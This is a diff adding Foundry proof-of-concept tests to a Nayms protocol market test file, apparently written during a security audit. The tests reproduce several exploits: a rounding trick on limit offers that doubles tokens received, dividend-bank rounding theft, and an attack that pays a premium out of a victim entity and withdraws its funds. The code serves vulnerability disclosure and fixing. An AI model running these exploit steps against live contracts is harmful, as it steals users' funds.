@@ -1035,4 +1035,399 @@ contract T04MarketTest is D03ProtocolDefaults, MockAccounts {
         m = logOfferDetails(lastOfferId);
         assertEq(m.state, LC.OFFER_STATE_FULFILLED, "unexpected offer state");
     }
+
+    function testMarketFacet0008_IM24522() public {
+        // sysadmin 2 ether
+        // whale 2 ehter
+        // user1 1e6 usdc
+        // user2 1e6 usdc
+        // --
+        // offer[15]
+        // --
+        // e1: [usdcObjectId, 1, 0, 0, false],
+        // user1 ext deposit 1e6 usdc
+        // --
+        // user1 normal order
+        // 1e6 usdc => 0.000001 e1
+        // "normal price"
+        // --
+        // user1 attack order
+        // 1e6 usdc => 0.000001999999999999 e1
+        // "attack price"
+        // gets x2 tokens
+
+        uint256 x = 10; // test scale
+
+        NaymsAccount memory acc1 = makeNaymsAcc("acc1");
+        NaymsAccount memory acc2 = makeNaymsAcc("acc2");
+        NaymsAccount memory acc2cp = makeNaymsAcc("acc2cp");
+
+        bytes32 entityId = acc1.entityId;
+
+        c.log("  - Crate demo entities");
+        vm.startPrank(sm.addr);
+        nayms.createEntity(
+            acc1.entityId,
+            acc1.id,
+            Entity({ assetId: usdcId, collateralRatio: 1, maxCapacity: 0, utilizedCapacity: 0, simplePolicyEnabled: false }),
+            "demo entity id1"
+        );
+        nayms.createEntity(
+            acc2.entityId,
+            acc2.id,
+            Entity({ assetId: usdcId, collateralRatio: 1, maxCapacity: 0, utilizedCapacity: 0, simplePolicyEnabled: false }),
+            "demo entity id2"
+        );
+        nayms.setEntity(acc2cp.id, acc2.entityId);
+        hAssignRole(acc2cp.id, acc2.entityId, LC.ROLE_ENTITY_CP);
+        vm.stopPrank();
+
+        c.log("  - E2 deposit 10 USDC");
+        vm.startPrank(acc2.addr);
+        writeTokenBalance(acc2.addr, naymsAddress, usdcAddress, 10 * 1e6 * x);
+        nayms.externalDeposit(usdcAddress, 10 * 1e6 * x);
+        vm.stopPrank();
+
+        c.log("  - E1 Start token sale => 1 USDC / PToken");
+        vm.startPrank(sm.addr);
+        nayms.enableEntityTokenization(acc1.entityId, "ptE1", "pToken-E1", 100);
+        nayms.startTokenSale(entityId, 1_000_000e18 * x, 1_000_000e6 * x); // sell 1 PToken for 1 USDCe6);
+        vm.stopPrank();
+
+        c.log(" - Test scale: %d".blue(), x);
+        /// ------- "Attack" ------- ///
+
+        vm.startPrank(acc2cp.addr);
+        c.log(string.concat("\n  - ", "normal offer by acc2".yellow()));
+        nayms.executeLimitOffer(usdcId, 1 * 1e6 * x, entityId, 1_000_000_000_000 * x);
+        c.log(string.concat("  - ptE1 balance1: ", nayms.internalBalanceOf(acc2.entityId, entityId).green()));
+        c.log(string.concat("  - USDC balance1: ", nayms.internalBalanceOf(acc2.entityId, usdcId).green()));
+
+        c.log(string.concat("\n  - ", "attack offer by acc2".red()));
+        nayms.executeLimitOffer(usdcId, 1 * 1e6 * x, entityId, 1_999_999_999_999 * x);
+        c.log(string.concat("  - ptE1 balance2: ", nayms.internalBalanceOf(acc2.entityId, entityId).green()));
+        c.log(string.concat("  - USDC balance2: ", nayms.internalBalanceOf(acc2.entityId, usdcId).green()));
+
+        vm.stopPrank();
+    }
+
+    function testMarketFacet0009AM() public {
+        c.log(">>>>> INIT");
+        NaymsAccount memory acc1 = makeNaymsAcc("acc1");
+        NaymsAccount memory acc2 = makeNaymsAcc("acc2");
+        NaymsAccount memory acc2cp = makeNaymsAcc("acc2cp");
+
+        c.log(">>>>> Create a test environment");
+        c.log("  - Crate demo entities");
+        vm.startPrank(sm.addr);
+        nayms.createEntity(
+            acc1.entityId,
+            acc1.id,
+            Entity({ assetId: usdcId, collateralRatio: 1, maxCapacity: 0, utilizedCapacity: 0, simplePolicyEnabled: false }),
+            "demo entity id1"
+        );
+        nayms.createEntity(
+            acc2.entityId,
+            acc2.id,
+            Entity({ assetId: usdcId, collateralRatio: 1, maxCapacity: 0, utilizedCapacity: 0, simplePolicyEnabled: false }),
+            "demo entity id2"
+        );
+        nayms.setEntity(acc2cp.id, acc2.entityId);
+        hAssignRole(acc2cp.id, acc2.entityId, LC.ROLE_ENTITY_CP);
+        vm.stopPrank();
+
+        c.log("  - E2 deposit some USDC");
+        vm.startPrank(acc2.addr);
+        writeTokenBalance(acc2.addr, naymsAddress, usdcAddress, 10 * 1e6);
+        nayms.externalDeposit(usdcAddress, 10 * 1e6);
+        vm.stopPrank();
+
+        c.log("  - E1 Start token sale => 0.9 PToken/USDC");
+        vm.startPrank(sm.addr);
+        nayms.enableEntityTokenization(acc1.entityId, "E1", "E1-pToken", 100);
+        nayms.startTokenSale(acc1.entityId, 0.9 * 1e6, 1 * 1e6);
+
+        uint256 offer1Id = nayms.getLastOfferId();
+        MarketInfo memory offer1 = nayms.getOffer(offer1Id);
+        c.log("    Offer ID: %s, state: %s", offer1Id, offer1.state);
+
+        c.log("  - E1 Start token sale => 1.1 PToken/USDC");
+        nayms.startTokenSale(acc1.entityId, 1.1 * 1e6, 1 * 1e6);
+
+        uint256 offer2Id = nayms.getLastOfferId();
+        MarketInfo memory offer2 = nayms.getOffer(offer2Id);
+        c.log("    Offer ID: %s, state: %s", offer2Id, offer2.state);
+        vm.stopPrank();
+        c.log();
+
+        c.log(">>>>> Account2 take offers (Limit Price: 1.0 PToken/USDC)");
+
+        vm.startPrank(acc2.addr);
+        writeTokenBalance(acc2.addr, naymsAddress, usdcAddress, 2 * 1e6);
+        nayms.externalDeposit(usdcAddress, 2 * 1e6);
+        vm.stopPrank();
+
+        vm.startPrank(acc2cp.addr);
+        nayms.executeLimitOffer(usdcId, 2 * 1e6, acc1.entityId, 2 * 1e6);
+        vm.stopPrank();
+
+        offer1 = nayms.getOffer(offer1Id);
+        offer2 = nayms.getOffer(offer2Id);
+        c.log("  - Offer1 state: %s", offer1.state);
+        c.log("  - Offer2 state: %s", offer2.state);
+        c.log();
+
+        c.log(">>>>> RESULT");
+        c.log("  - The limit price is 1.0 PToken/USDC,");
+        c.log("    but it also take offer whose price is 0.9 PToken/USDC.");
+        c.log("  - If you look at the call stack, you will find that the offer of 1.1 was taken first,");
+        c.log("    and then the offer of 0.9 was taken.");
+    }
+
+    function testPOC0010() public {
+        testStartTokenSale();
+        //////// Create offers
+        changePrank(sm.addr);
+        for (uint256 i = 1; i < 1000; ++i) {
+            nayms.startTokenSale(entity1, i, 1);
+        }
+        ////////
+
+        changePrank(sm.addr);
+        nayms.assignRole(signer2Id, systemContext, LC.ROLE_ENTITY_CP);
+
+        // init and fund taker entity
+        nayms.createEntity(entity2, signer2Id, initEntity(wethId, collateralRatio_500, maxCapital_2000eth, true), "test");
+
+        changePrank(signer2);
+        writeTokenBalance(signer2, naymsAddress, wethAddress, dt.entity2ExternalDepositAmt);
+        nayms.externalDeposit(wethAddress, dt.entity2ExternalDepositAmt);
+
+        uint256 gasStart = gasleft();
+        nayms.executeLimitOffer(wethId, 1_000 ether, entity1, 500 ether);
+        c.log(">>>>> gas cost: %s", gasStart - gasleft());
+        vm.stopPrank();
+
+        assertEq(nayms.internalBalanceOf(entity2, entity1), 500 ether, "should match takers buy amount, not sell amount");
+
+        uint256 offerId = nayms.getLastOfferId();
+        MarketInfo memory offer = nayms.getOffer(offerId);
+        assertEq(offer.state, LC.OFFER_STATE_FULFILLED, "offer should be closed");
+    }
+
+    function testMarketFacet0011() public {
+        c.log(">>>>> Create a test environment ...");
+        c.log("  - Crate user accounts");
+        NaymsAccount memory acc1 = makeNaymsAcc("acc1");
+        NaymsAccount memory acc1em = makeNaymsAcc("acc1em");
+        NaymsAccount memory acc1ctrl = makeNaymsAcc("acc1ctrl");
+        NaymsAccount memory acc2 = makeNaymsAcc("acc2");
+        NaymsAccount memory acc2em = makeNaymsAcc("acc2em");
+        NaymsAccount memory acc2ctrl = makeNaymsAcc("acc2ctrl");
+        NaymsAccount memory acc2cp = makeNaymsAcc("acc2cp");
+        NaymsAccount memory acc3 = makeNaymsAcc("acc3");
+
+        vm.startPrank(sm.addr);
+        c.log("  - Crate DemoEntity1");
+        nayms.createEntity(
+            acc1.entityId,
+            acc1.id,
+            Entity({ assetId: usdcId, collateralRatio: 1, maxCapacity: 0, utilizedCapacity: 0, simplePolicyEnabled: false }),
+            "entity test hash"
+        );
+        nayms.enableEntityTokenization(acc1.entityId, "DemoEntity1", "DemoEntity1", 100);
+
+        c.log("  - Crate DemoEntity2");
+        nayms.createEntity(
+            acc2.entityId,
+            acc2.id,
+            Entity({ assetId: usdcId, collateralRatio: 1, maxCapacity: 0, utilizedCapacity: 0, simplePolicyEnabled: false }),
+            "entity test hash"
+        );
+        nayms.enableEntityTokenization(acc2.entityId, "DemoEntity2", "DemoEntity2", 100);
+
+        c.log("  - Crate DemoEntity3");
+        nayms.createEntity(
+            acc3.entityId,
+            acc3.id,
+            Entity({ assetId: usdcId, collateralRatio: 1, maxCapacity: 0, utilizedCapacity: 0, simplePolicyEnabled: false }),
+            "entity test hash"
+        );
+
+        nayms.setEntity(acc1em.id, acc1.entityId);
+        nayms.setEntity(acc1ctrl.id, acc1.entityId);
+        nayms.setEntity(acc2em.id, acc2.entityId);
+        nayms.setEntity(acc2ctrl.id, acc2.entityId);
+        nayms.setEntity(acc2cp.id, acc2.entityId);
+
+        c.log("  - Assign DemoEntity2 CP");
+        hAssignRole(acc2cp.id, acc2.entityId, LC.ROLE_ENTITY_CP);
+        vm.stopPrank();
+
+        c.log("  - Assign entity managers");
+        vm.startPrank(sa.addr);
+        hAssignRole(acc1em.id, acc1.entityId, LC.ROLE_ENTITY_MANAGER);
+        hAssignRole(acc2em.id, acc2.entityId, LC.ROLE_ENTITY_MANAGER);
+        vm.stopPrank();
+
+        c.log("  - Assign DemoEntity1 comptroller");
+        vm.startPrank(acc1em.addr);
+        hAssignRole(acc1ctrl.id, acc1.entityId, LC.ROLE_ENTITY_COMPTROLLER_COMBINED);
+        vm.stopPrank();
+
+        c.log("  - Assign DemoEntity2 comptroller");
+        vm.startPrank(acc2em.addr);
+        hAssignRole(acc2ctrl.id, acc2.entityId, LC.ROLE_ENTITY_COMPTROLLER_COMBINED);
+        vm.stopPrank();
+
+        c.log("  - DemoEntity1 deposit 100 USDC");
+        vm.startPrank(acc1.addr);
+        writeTokenBalance(acc1.addr, naymsAddress, usdcAddress, 100 * 1e6);
+        nayms.externalDeposit(usdcAddress, 100 * 1e6);
+        vm.stopPrank();
+
+        c.log("  - DemoEntity2 deposit 100 USDC");
+        vm.startPrank(acc2.addr);
+        writeTokenBalance(acc2.addr, naymsAddress, usdcAddress, 100 * 1e6);
+        nayms.externalDeposit(usdcAddress, 100 * 1e6);
+        vm.stopPrank();
+
+        c.log("  - DemoEntity1 start token sale");
+        vm.startPrank(sm.addr);
+        nayms.startTokenSale(acc1.entityId, 1 * 1e6, 1 * 1e6);
+        vm.stopPrank();
+
+        c.log("  - DemoEntity1 pay dividend: 100 USDC");
+        vm.startPrank(acc1ctrl.addr);
+        nayms.payDividendFromEntity("DemoEntity1 pay dividend", 100 * 1e6 - 1);
+        vm.stopPrank();
+
+        c.log("  - USDC balance of Dividend Bank: %s", nayms.internalBalanceOf("Dividend Bank", usdcId));
+        c.log();
+
+        c.log(">>>>> Account2 begin attack ...");
+        c.log("  - DemoEntity2 start token sale and buyback to get some PToken (cancelling would burn them)");
+        vm.startPrank(sm.addr);
+        nayms.startTokenSale(acc2.entityId, 2 * 1e6, 2 * 1e6);
+        vm.stopPrank();
+        // vm.startPrank(acc2em.addr);
+        // nayms.cancelOffer(nayms.getLastOfferId());
+        vm.startPrank(acc2cp.addr);
+        nayms.executeLimitOffer(usdcId, 2 * 1e6, acc2.entityId, 2 * 1e6);
+        c.log("  - internalBalanceOf(acc2.entityId) after EXECUTE:", nayms.internalBalanceOf(acc2.entityId, acc2.entityId));
+        vm.stopPrank();
+
+        c.log("  - DemoEntity2 pay dividend: 0.999999 USDC");
+        vm.startPrank(acc2ctrl.addr);
+        nayms.payDividendFromEntity("DemoEntity2 pay dividend", 1 * 1e6 - 5);
+        vm.stopPrank();
+
+        c.log("  - DemoEntity2 withdraw all dividends");
+        c.log("  - USDC balance of Dividend Bank BEFORE withdraw #1: %s", nayms.internalBalanceOf("Dividend Bank", usdcId));
+        nayms.withdrawAllDividends(acc2.entityId, acc2.entityId);
+        c.log("  - USDC balance of Dividend Bank AFTER withdraw #1: %s", nayms.internalBalanceOf("Dividend Bank", usdcId));
+        c.log();
+
+        c.log(">>>>> Key Step ...");
+        c.log("  - Account2 transfer some PToken2 to Account3");
+        vm.startPrank(acc2.addr);
+        c.log("  - internalBalanceOf(acc2.entityId) BEFORE:", nayms.internalBalanceOf(acc2.entityId, acc2.entityId));
+        nayms.internalTransferFromEntity(acc3.entityId, acc2.entityId, 1000);
+        c.log("  - internalBalanceOf(acc2.entityId) AFTER:", nayms.internalBalanceOf(acc2.entityId, acc2.entityId));
+        c.log("  - internalBalanceOf(acc3.entityId) AFTER:", nayms.internalBalanceOf(acc3.entityId, acc2.entityId));
+        vm.stopPrank();
+        nayms.withdrawAllDividends(acc3.id, acc2.entityId);
+        c.log("  - USDC balance of Dividend Bank AFTER withdraw #2: %s", nayms.internalBalanceOf("Dividend Bank", usdcId));
+        c.log("      ^ DemoEntity2 stole 2 wei USDC from Dividend Bank ???");
+    }
+
+    function testAttackWithFakeEntity_IM24777() public {
+        vm.startPrank(sa.addr);
+
+        Entity memory entityData = Entity({ assetId: usdcId, collateralRatio: 10_000, maxCapacity: 1_000_000e6, utilizedCapacity: 0, simplePolicyEnabled: true });
+        Entity memory entityFakeData = Entity({ assetId: usdcId, collateralRatio: 10_000, maxCapacity: 1_0006, utilizedCapacity: 0, simplePolicyEnabled: false });
+        uint256 usdc1m = 1_000_000;
+
+        NaymsAccount memory victim = makeNaymsAcc("victims");
+
+        NaymsAccount memory attackerFake = makeNaymsAcc("attackersFakes");
+        NaymsAccount memory attackerReal = makeNaymsAcc("attackerReals");
+        NaymsAccount memory attackerBackup = makeNaymsAcc("attackerBackUps");
+
+        vm.startPrank(sm.addr);
+
+        c.log("\n\n--------------------------------".green());
+        c.log(string.concat("attackerReal   id:", vm.toString(attackerReal.id).green(), " entityID:", vm.toString(attackerReal.entityId).green()));
+        c.log(string.concat("attackerFake   id:", vm.toString(attackerFake.id).green(), " entityID:", vm.toString(attackerFake.entityId).green()));
+        c.log(string.concat("attackerBackup id:", vm.toString(attackerBackup.id).green(), " entityID:", vm.toString(attackerBackup.entityId).green()));
+        c.log(string.concat("victim         id:", vm.toString(victim.id).green(), " entityID:", vm.toString(victim.entityId).green()));
+        c.log("--------------------------------\n\n".green());
+
+        hCreateEntity(attackerReal.entityId, attackerReal.id, entityData, "attackerReals");
+        hCreateEntity(attackerFake.entityId, victim.id, entityFakeData, "attackersFakes");
+        hCreateEntity(attackerFake.id, victim.id, entityFakeData, "attackersFakesId");
+        hCreateEntity(victim.entityId, victim.id, entityData, "victims");
+        hCreateEntity(attackerBackup.entityId, attackerFake.id, entityData, "attackerBackUps");
+
+        // @attack  million is chosen since its impact in the contract but it can be any token as long as it has internalBalance  and policy can be created for it to work
+        fundEntityUsdc(victim, 1_000_000e6);
+
+        //@attack funds can be flashloaned to make the  attack cheaper
+        fundEntityUsdc(attackerReal, 1_000_000e6);
+
+        c.log("victim balance BEFORE the attack:  ", nayms.internalBalanceOf(victim.entityId, usdcId).green());
+        c.log("attacker balance BEFORE the attack:", nayms.internalBalanceOf(attackerReal.entityId, usdcId).green());
+
+        vm.startPrank(sm.addr);
+        // setting the parent @note the parent dosnt have to be done in the same tx as the attack
+        nayms.setEntity(attackerBackup.id, attackerFake.id);
+        vm.stopPrank();
+
+        vm.startPrank(sa.addr);
+        // now we are going to create a policy for the attacker then we can drain the victim
+        uint256 policyLimit = usdc1m;
+        (Stakeholders memory stakeHolders, SimplePolicy memory simplePolicy) = initPolicyWithLimitAndAssetAndAttacker(policyLimit, usdcId, attackerBackup, attackerFake);
+
+        // admin dosnt know of the attack yet since it can another transaction a way and its regular action
+        nayms.updateRoleAssigner(LC.GROUP_PAY_SIMPLE_PREMIUM, LC.GROUP_PAY_SIMPLE_PREMIUM);
+        nayms.updateRoleGroup(LC.GROUP_PAY_SIMPLE_PREMIUM, LC.GROUP_PAY_SIMPLE_PREMIUM, true);
+
+        vm.startPrank(su.addr);
+        nayms.createSimplePolicy(bytes32("1"), attackerReal.entityId, stakeHolders, simplePolicy, "offchain");
+        vm.stopPrank();
+        c.log(" -- policy created (for attacker entity)".yellow());
+
+        // now the attacker is going to drain the internal balance of usdc from the victim
+        vm.startPrank(sm.addr);
+        // @note this can be done not in the attack but is benifical or if its the biggest account
+        //              user             entity
+        c.log(" -- set victim entity as attacker's parent".yellow());
+        nayms.setEntity(attackerFake.id, victim.entityId);
+        vm.stopPrank();
+
+        vm.startPrank(attackerFake.addr);
+        nayms.paySimplePremium(bytes32("1"), 1_000_000e6);
+        vm.stopPrank();
+        c.log(" -- premium paid by atacker (from victim entity)".yellow());
+
+        uint256 internalBalance = nayms.internalBalanceOf(victim.entityId, usdcId);
+        require(internalBalance == 0);
+        c.log("victim balance AFTER the attack:  ", internalBalance.green());
+
+        internalBalance = nayms.internalBalanceOf(attackerReal.entityId, usdcId);
+        c.log("attacker balance AFTER the attack:", internalBalance.green());
+
+        // Now the attacker will withdraw since they will have no problems withdraws since its real entity and owned by the attacker
+        vm.startPrank(su.addr);
+        // @note attacker cancels their policy to  get all their funds back
+        nayms.cancelSimplePolicy(bytes32("1"));
+        vm.stopPrank();
+        c.log(" -- policy cancelled".yellow());
+
+        vm.startPrank(attackerReal.addr);
+        // we take all funds in the contract
+        nayms.externalWithdrawFromEntity(attackerReal.entityId, attackerReal.addr, address(usdc), internalBalance);
+        c.log("funds stolen and limit: ", usdc.balanceOf(attackerReal.addr).green());
+        c.log("[+] externalWithdrawFromEntity DONE".cyan());
+    }
 }
